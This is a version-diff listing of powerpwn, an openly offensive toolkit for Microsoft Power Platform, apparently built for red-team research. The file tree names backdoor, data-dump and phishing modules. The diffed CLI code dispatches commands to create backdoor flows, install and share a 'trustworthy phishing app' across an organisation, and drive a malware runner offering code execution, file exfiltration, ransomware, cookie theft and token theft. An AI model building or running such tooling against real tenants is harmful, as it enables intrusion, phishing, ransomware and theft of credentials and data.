+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:37.387805 powerpwn-2.1.2/src/powerpwn/powerdoor/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.2/src/powerpwn/powerdoor/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3765 2023-07-28 07:22:48.000000 powerpwn-2.1.2/src/powerpwn/powerdoor/backdoor_flow.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      311 2023-07-24 10:03:36.000000 powerpwn-2.1.2/src/powerpwn/powerdoor/create_flow_model.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:37.584233 powerpwn-2.1.2/src/powerpwn/powerdoor/enums/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.2/src/powerpwn/powerdoor/enums/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      233 2023-07-28 07:20:23.000000 powerpwn-2.1.2/src/powerpwn/powerdoor/enums/action_type.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      126 2023-07-24 10:03:36.000000 powerpwn-2.1.2/src/powerpwn/powerdoor/enums/flow_state.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1845 2023-07-28 07:22:29.000000 powerpwn-2.1.2/src/powerpwn/powerdoor/flow_factory_installer.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:37.782869 powerpwn-2.1.2/src/powerpwn/powerdoor/samples/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.2/src/powerpwn/powerdoor/samples/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)    23081 2023-07-27 21:35:53.000000 powerpwn-2.1.2/src/powerpwn/powerdoor/samples/flow_factory_to_install.json
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2579 2023-07-24 10:03:36.000000 powerpwn-2.1.2/src/powerpwn/powerdoor/samples/forward email_backdoor_flow.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:37.838375 powerpwn-2.1.2/src/powerpwn/powerdump/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/__init__.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:37.891430 powerpwn-2.1.2/src/powerpwn/powerdump/collect/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/__init__.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:38.123849 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/__init__.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:38.267136 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3485 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connections_data_collector.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:39.430635 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1577 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2507 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/connector_base.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     6158 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/excelonlinebusiness.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1767 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/github.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     7120 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/gmail.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4139 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/keyvault.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     5868 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azureblob.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3777 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azurequeues.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3897 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azuretables.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3934 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_documentdb.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4330 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_sql.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1235 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/data_collector.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:39.747812 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/enums/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/enums/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      132 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/enums/data_dump_source.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      280 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/enums/data_dump_type.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      211 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/data_collectors/idata_collector.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:40.817006 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      756 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/base_entity.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      524 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/base_validator.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      477 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/canvas_app_entity.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1293 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/connection_entity.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2047 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/connector_entity.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      674 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/data_dump_entity.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      781 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/data_record_entity.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1027 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/data_store_entity.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      496 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/data_store_validator.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      507 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/principal_entity.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      370 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/models/resource_entity_base.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:41.429039 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3424 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/_api.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4945 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/canvas_apps_collector.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4689 2023-07-28 07:22:48.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/connections_collector.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2721 2023-07-28 07:22:48.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/connectors_collector.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:41.604575 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/enums/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/enums/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      202 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/enums/resource_type.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      707 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/iresource_collector.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2659 2023-07-28 07:22:48.000000 powerpwn-2.1.2/src/powerpwn/powerdump/collect/resources_collectors/resources_collector.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:41.805736 powerpwn-2.1.2/src/powerpwn/powerdump/gui/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1859 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/gui.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4434 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/prep.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:42.468236 powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       73 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1422 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/base.html
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1127 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/canvasapps_table.html
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1711 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/connections_table.html
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      983 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/connectors_table.html
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      303 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/json_object.html
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1523 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/logic_flows_table.html
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1129 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerdump/gui/templates/resources_table.html
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:43.059314 powerpwn-2.1.2/src/powerpwn/powerdump/utils/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/utils/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4748 2023-08-01 10:49:44.000000 powerpwn-2.1.2/src/powerpwn/powerdump/utils/auth.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      375 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerdump/utils/const.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4593 2023-07-28 07:22:48.000000 powerpwn-2.1.2/src/powerpwn/powerdump/utils/json_utils.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     6026 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerdump/utils/model_loaders.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1107 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/utils/path_utils.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3124 2023-07-28 07:22:48.000000 powerpwn-2.1.2/src/powerpwn/powerdump/utils/requests_wrapper.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1098 2023-07-27 11:45:05.000000 powerpwn-2.1.2/src/powerpwn/powerdump/utils/token_cache.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:43.173007 powerpwn-2.1.2/src/powerpwn/powerphishing/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerphishing/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     8772 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/powerphishing/app_installer.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:35.193144 powerpwn-2.1.2/src/powerpwn.egg-info/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       76 2023-08-01 10:50:32.000000 powerpwn-2.1.2/src/powerpwn.egg-info/PKG-INFO
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     6197 2023-08-01 10:50:34.000000 powerpwn-2.1.2/src/powerpwn.egg-info/SOURCES.txt
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        1 2023-08-01 10:50:32.000000 powerpwn-2.1.2/src/powerpwn.egg-info/dependency_links.txt
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       48 2023-08-01 10:50:32.000000 powerpwn-2.1.2/src/powerpwn.egg-info/entry_points.txt
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      332 2023-08-01 10:50:32.000000 powerpwn-2.1.2/src/powerpwn.egg-info/requires.txt
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        9 2023-08-01 10:50:32.000000 powerpwn-2.1.2/src/powerpwn.egg-info/top_level.txt
```

### Comparing `powerpwn-2.1.1/setup.cfg` & `powerpwn-2.1.2/setup.cfg`

 * *Files 2% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 [metadata]
 name = powerpwn
 author = Michael Bargury
-version = 2.1.1
+version = 2.1.2
 
 [options]
 install_requires = 
 	pydantic[email] ==1.10.7
 	pydantic ==1.10.7
 	swagger-ui-py ==22.7.13
 	Flask ==2.2.5
@@ -40,15 +40,15 @@
 [options.entry_points]
 console_scripts = 
 	powerpwn = powerpwn.main:main
 
 [mypy]
 plugins = pydantic.mypy
 show_error_codes = true
-follow_imports = "normal"
+follow_imports = normal
 ignore_errors = false
 implicit_reexport = false
 warn_redundant_casts = true
 warn_unused_ignores = true
 disallow_any_generics = true
 disallow_untyped_defs = true
 disallow_incomplete_defs = true
```

### Comparing `powerpwn-2.1.1/src/powerpwn/cli/arguments.py` & `powerpwn-2.1.2/src/powerpwn/cli/arguments.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 import argparse
 import logging
 
-from powerpwn.machinepwn.enums.code_exec_type_enum import CodeExecTypeEnum
+from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
 from powerpwn.powerdoor.enums.action_type import BackdoorActionType
 from powerpwn.powerdump.utils.const import CACHE_PATH
 
 
 def module_gui(sub_parser: argparse.ArgumentParser):
     gui_parser = sub_parser.add_parser("gui", description="Show collected resources and data.", help="Show collected resources and data via GUI.")
     gui_parser.add_argument("--cache-path", default=CACHE_PATH, type=str, help="Path to cached resources.")
@@ -99,15 +99,29 @@
         BackdoorActionType.install_factory.value, description="Install flow factory", help="Installs flow factory in powerplatform"
     )
     installer.add_argument("-c", "--connection-id", required=True, type=str, help="The connection id of management connection")
     installer.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
 
 
 def module_phishing(command_subparsers: argparse.ArgumentParser):
-    command_subparsers.add_parser("phishing", description="Deploy a trustworthy phishing app", help="Deploy a trustworthy phishing app.")
+    phishing = command_subparsers.add_parser("phishing", description="Deploy a trustworthy phishing app", help="Deploy a trustworthy phishing app.")
+    phishing_subparsers = phishing.add_subparsers(help="phishing_subcommand", dest="phishing_subcommand")
+
+    installer = phishing_subparsers.add_parser(
+        "install-app", description="Installs phishing app.", help="Installs a phishing app in the target environment."
+    )
+    installer.add_argument("-i", "--input", type=str, required=True, help="Path to app package zip file.")
+    installer.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
+    installer.add_argument("-n", "--app-name", required=True, type=str, help="Display name of the app.")
+    installer.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id to install the app in.")
+
+    app_share = phishing_subparsers.add_parser("share-app", description="Share app with organization", help="Share app with organization")
+    app_share.add_argument("-a", "--app-id", required=True, type=str, help="App id to share")
+    app_share.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id that the app belongs to.")
+    app_share.add_argument("-t", "--tenant", required=True, type=str, help="Tenant id to connect.")
 
 
 def parse_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
     command_subparsers = parser.add_subparsers(help="command", dest="command")
```

### Comparing `powerpwn-2.1.1/src/powerpwn/cli/runners.py` & `powerpwn-2.1.2/src/powerpwn/cli/runners.py`

 * *Files 20% similar despite different names*

```diff
@@ -1,110 +1,116 @@
-import json
-import logging
-import os
-import shutil
-
-from powerpwn.cli.const import LOGGER_NAME
-from powerpwn.machinepwn.enums.code_exec_type_enum import CodeExecTypeEnum
-from powerpwn.machinepwn.enums.command_to_run_enum import CommandToRunEnum
-from powerpwn.machinepwn.machine_pwn import MachinePwn
-from powerpwn.powerdoor.backdoor_flow import BackdoorFlow
-from powerpwn.powerdoor.enums.action_type import BackdoorActionType
-from powerpwn.powerdoor.flow_factory_installer import FlowFlowInstaller
-from powerpwn.powerdump.collect.data_collectors.data_collector import DataCollector
-from powerpwn.powerdump.collect.resources_collectors.resources_collector import ResourcesCollector
-from powerpwn.powerdump.gui.gui import Gui
-from powerpwn.powerdump.utils.auth import acquire_token, acquire_token_from_cached_refresh_token
-from powerpwn.powerdump.utils.const import API_HUB_SCOPE, POWER_APPS_SCOPE
-
-logger = logging.getLogger(LOGGER_NAME)
-
-
-def __init_command_token(args, scope: str) -> str:
-    # if cached refresh token is found, use it
-    if token := acquire_token_from_cached_refresh_token(scope, args.tenant):
-        return token
-
-    return acquire_token(scope=scope, tenant=args.tenant)
-
-
-def run_dump_command(args):
-    _run_collect_resources_command(args)
-    _run_collect_data_command(args)
-    logger.info(f"Dump is completed in {args.cache_path}")
-
-    if args.gui:
-        logger.info("Going to run local server for gui")
-        run_gui_command(args)
-
-
-def _run_collect_resources_command(args):
-    # cache
-    if args.clear_cache:
-        try:
-            shutil.rmtree(args.cache_path)
-        except FileNotFoundError:
-            pass
-    os.makedirs(args.cache_path, exist_ok=True)
-
-    token = __init_command_token(args, POWER_APPS_SCOPE)
-
-    entities_fetcher = ResourcesCollector(token=token, cache_path=args.cache_path)
-    entities_fetcher.collect_and_cache()
-
-
-def run_gui_command(args):
-    Gui().run(cache_path=args.cache_path)
-
-
-def _run_collect_data_command(args):
-    token = __init_command_token(args, API_HUB_SCOPE)
-    DataCollector(token=token, cache_path=args.cache_path).collect()
-
-
-def run_backdoor_flow_command(args):
-
-    action_type = BackdoorActionType(args.backdoor_subcommand)
-    if action_type == BackdoorActionType.delete_flow:
-        backdoor_flow = BackdoorFlow(args.webhook_url)
-        backdoor_flow.delete_flow(args.environment_id, args.flow_id)
-
-    elif action_type == BackdoorActionType.create_flow:
-        backdoor_flow = BackdoorFlow(args.webhook_url)
-        backdoor_flow.create_flow_from_input_file(args.environment_id, args.input)
-
-    elif action_type == BackdoorActionType.get_connections:
-        backdoor_flow = BackdoorFlow(args.webhook_url)
-        output_to_file = args.output and args.output != ""
-        connections = backdoor_flow.get_connections(args.environment_id, not output_to_file)
-        if output_to_file:
-            f = open(args.output, "w+")
-            f.write(json.dumps(connections, indent=4))
-        else:
-            logger.info(connections)
-
-    elif action_type == BackdoorActionType.install_factory:
-        token = __init_command_token(args, POWER_APPS_SCOPE)
-        FlowFlowInstaller(token).install(args.environment_id, args.connection_id)
-
-
-def run_nocodemalware_command(args):
-    machine_pwn = MachinePwn(args.webhook_url)
-
-    command_type = CommandToRunEnum(args.nocodemalware_subcommand)
-    if command_type == CommandToRunEnum.CLEANUP:
-        res = machine_pwn.cleanup()
-    elif command_type == CommandToRunEnum.CODE_EXEC:
-        res = machine_pwn.exec_command(args.command_to_execute, CodeExecTypeEnum(args.type))
-    elif command_type == CommandToRunEnum.EXFILTRATION:
-        res = machine_pwn.exfiltrate(args.file)
-    elif command_type == CommandToRunEnum.RANSOMWARE:
-        res = machine_pwn.ransomware(args.crawl_depth, args.dirs.split(","), args.encryption_key)
-    elif command_type == CommandToRunEnum.STEAL_COOKIE:
-        res = machine_pwn.steal_cookie(args.cookie)
-    elif command_type == CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN:
-        res = machine_pwn.steal_power_automate_token()
-    print(res)
-
-
-def run_phishing_command(args):
-    raise NotImplementedError("Phishing command has not been implemented yet.")
+import json
+import logging
+import os
+import shutil
+
+from powerpwn.cli.const import LOGGER_NAME
+from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
+from powerpwn.nocodemalware.enums.command_to_run_enum import CommandToRunEnum
+from powerpwn.nocodemalware.malware_runner import MalwareRunner
+from powerpwn.powerdoor.backdoor_flow import BackdoorFlow
+from powerpwn.powerdoor.enums.action_type import BackdoorActionType
+from powerpwn.powerdoor.flow_factory_installer import FlowFlowInstaller
+from powerpwn.powerdump.collect.data_collectors.data_collector import DataCollector
+from powerpwn.powerdump.collect.resources_collectors.resources_collector import ResourcesCollector
+from powerpwn.powerdump.gui.gui import Gui
+from powerpwn.powerdump.utils.auth import acquire_token, acquire_token_from_cached_refresh_token
+from powerpwn.powerdump.utils.const import API_HUB_SCOPE, POWER_APPS_SCOPE
+from powerpwn.powerphishing.app_installer import AppInstaller
+
+logger = logging.getLogger(LOGGER_NAME)
+
+
+def __init_command_token(args, scope: str) -> str:
+    # if cached refresh token is found, use it
+    if token := acquire_token_from_cached_refresh_token(scope, args.tenant):
+        return token
+
+    return acquire_token(scope=scope, tenant=args.tenant)
+
+
+def run_dump_command(args):
+    _run_collect_resources_command(args)
+    _run_collect_data_command(args)
+    logger.info(f"Dump is completed in {args.cache_path}")
+
+    if args.gui:
+        logger.info("Going to run local server for gui")
+        run_gui_command(args)
+
+
+def _run_collect_resources_command(args):
+    # cache
+    if args.clear_cache:
+        try:
+            shutil.rmtree(args.cache_path)
+        except FileNotFoundError:
+            pass
+    os.makedirs(args.cache_path, exist_ok=True)
+
+    token = __init_command_token(args, POWER_APPS_SCOPE)
+
+    entities_fetcher = ResourcesCollector(token=token, cache_path=args.cache_path)
+    entities_fetcher.collect_and_cache()
+
+
+def run_gui_command(args):
+    Gui().run(cache_path=args.cache_path)
+
+
+def _run_collect_data_command(args):
+    token = __init_command_token(args, API_HUB_SCOPE)
+    DataCollector(token=token, cache_path=args.cache_path).collect()
+
+
+def run_backdoor_flow_command(args):
+    action_type = BackdoorActionType(args.backdoor_subcommand)
+    if action_type == BackdoorActionType.delete_flow:
+        backdoor_flow = BackdoorFlow(args.webhook_url)
+        backdoor_flow.delete_flow(args.environment_id, args.flow_id)
+
+    elif action_type == BackdoorActionType.create_flow:
+        backdoor_flow = BackdoorFlow(args.webhook_url)
+        backdoor_flow.create_flow_from_input_file(args.environment_id, args.input)
+
+    elif action_type == BackdoorActionType.get_connections:
+        backdoor_flow = BackdoorFlow(args.webhook_url)
+        output_to_file = args.output and args.output != ""
+        connections = backdoor_flow.get_connections(args.environment_id, not output_to_file)
+        if output_to_file:
+            f = open(args.output, "w+")
+            f.write(json.dumps(connections, indent=4))
+        else:
+            logger.info(connections)
+
+    elif action_type == BackdoorActionType.install_factory:
+        token = __init_command_token(args, POWER_APPS_SCOPE)
+        FlowFlowInstaller(token).install(args.environment_id, args.connection_id)
+
+
+def run_nocodemalware_command(args):
+    malware_runner = MalwareRunner(args.webhook_url)
+
+    command_type = CommandToRunEnum(args.nocodemalware_subcommand)
+    if command_type == CommandToRunEnum.CLEANUP:
+        res = malware_runner.cleanup()
+    elif command_type == CommandToRunEnum.CODE_EXEC:
+        res = malware_runner.exec_command(args.command_to_execute, CodeExecTypeEnum(args.type))
+    elif command_type == CommandToRunEnum.EXFILTRATION:
+        res = malware_runner.exfiltrate(args.file)
+    elif command_type == CommandToRunEnum.RANSOMWARE:
+        res = malware_runner.ransomware(args.crawl_depth, args.dirs.split(","), args.encryption_key)
+    elif command_type == CommandToRunEnum.STEAL_COOKIE:
+        res = malware_runner.steal_cookie(args.cookie)
+    elif command_type == CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN:
+        res = malware_runner.steal_power_automate_token()
+    print(res)
+
+
+def run_phishing_command(args):
+    token = __init_command_token(args, POWER_APPS_SCOPE)
+    app_installer = AppInstaller(token)
+    if args.phishing_subcommand == "install-app":
+        return app_installer.install_app(args.input, args.app_name, args.environment_id)
+    elif args.phishing_subcommand == "share-app":
+        return app_installer.share_app_with_org(args.app_id, args.environment_id, args.tenant)
+    raise NotImplementedError("Phishing command has not been implemented yet.")
```

### Comparing `powerpwn-2.1.1/src/powerpwn/enums/str_enum.py` & `powerpwn-2.1.2/src/powerpwn/enums/str_enum.py`

 * *Files identical despite different names*

### Comparing `powerpwn-2.1.1/src/powerpwn/machinepwn/machine_pwn.py` & `powerpwn-2.1.2/src/powerpwn/nocodemalware/malware_runner.py`

 * *Files 17% similar despite different names*

```diff
@@ -1,30 +1,30 @@
 import json
 from typing import List
 
 import requests
 from pydantic.error_wrappers import ValidationError
 
-from powerpwn.machinepwn.enums.code_exec_type_enum import CodeExecTypeEnum
-from powerpwn.machinepwn.models.any_command_args import AnyCommandArgs
-from powerpwn.machinepwn.models.cleanup_command_args import CleanupCommandArgs
-from powerpwn.machinepwn.models.cmd_results import CommandResults
-from powerpwn.machinepwn.models.code_exec_args_properties import CodeExecArgsProperties
-from powerpwn.machinepwn.models.code_exec_command_args import CodeExecCommandArgs
-from powerpwn.machinepwn.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
-from powerpwn.machinepwn.models.exflirtate_file_args_properties import ExflirtateFileArgsProperties
-from powerpwn.machinepwn.models.exflirtate_file_command_args import ExflirtateFileCommandArgs
